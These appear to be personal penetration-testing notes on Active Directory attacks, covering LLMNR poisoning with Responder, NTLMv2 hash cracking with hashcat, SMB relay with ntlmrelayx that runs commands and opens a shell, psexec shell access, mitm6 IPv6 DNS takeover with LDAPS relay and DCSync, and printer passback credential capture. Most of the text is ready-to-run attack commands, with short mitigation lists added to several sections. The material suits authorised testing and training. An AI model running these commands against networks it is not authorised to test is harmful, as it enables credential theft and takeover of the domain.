
LLMNR Poisoning:

>MitM
>responder
>	`sudo responder -I eth0 -dwPv`
>		ensure ip is correct, and everything is ON by default (mainly HTTPS and SMB)
>	Intercept request to gain hash
>		On target machine,` \\attackerip`
>	a
>	place hash(es) in hashes.txt
>	
>	`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -O
>		`-m detrmined module. hashcat --help | grep NTLM
>		you can use --force to force the VM
>		`-r OneRule` for advanced cracking
>	
>	`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
>	
>	
>	Mitigation:
>		Disable LLMNR and NTBDS
>		If unable to do this, require Network Access Control
>		a
>		 require strong password policy to avoid hash cracking


SMB Relay Attacks

>SMB signing must be disabled or not enforced (DC defaullt disabled)
>
>	Check using `nmap --script=smb2-security-mode.nse -p445 IP/24 (-Pn)
>	Run responder again
>	`sudo ntlmrelayx.py -tf targets.txt -smb2support -c "command to run"
>	Event connects to attacker machine
>	Check admin hash
>	`sudo ntlmrelayx.py -tf targets.txt -smb2support -c "command to run" -i
>	same attack opens a client shell on 127.0.0.1:11000
>	`nc 127.0.0.1 11000
>	
>Defense:
>Enable SMG signing on all devices
>Disable NTLM authentication
>Account tiering
>Local admin restriction)


Gaining Shell Access:

>msfconsole (exploit/windows/smb/psexec)
>	you can set the password as plaintext or hash
>	set rhosts
>	set smbdomain <name.local>
>	set smbuser
>	set smbpass
>	a
>	background
>	sessions ID
>
>psexec.py dcname.local/user:'Password'@target-ip
>OR
>psexec.py administrator@IP-ADDY -hashes password-hash


IPv6 Attacks (DNS Takeover):

>mitm6
>DO NOT RUN LONGER THAN 5-10 MINUTES AT A TIME
	ntlmrelayx.py -6 -t ldaps://dc-ip -wh fakewpad.domain.local -l lootme
	sudo mitm6 -d dcname.local
	Check lootme directory
	Watch mitm6, if a login from an administrator account is intercepted, it could create an account for the attacker
	You can use DCSync using secretsdump.py
		a
	Mitigation:
		set up blocks blocking inbound and outbound IPv6 requests
		disable WPAD if uneeded
		enable LDAP signing
		mark administration accounts as sensitive, or a Protected User

Passback Attacks:

>Change printer LDAP to attacker IP and port
>set up listener using responder or netcat -L -p 389
>password will be sent to attacker


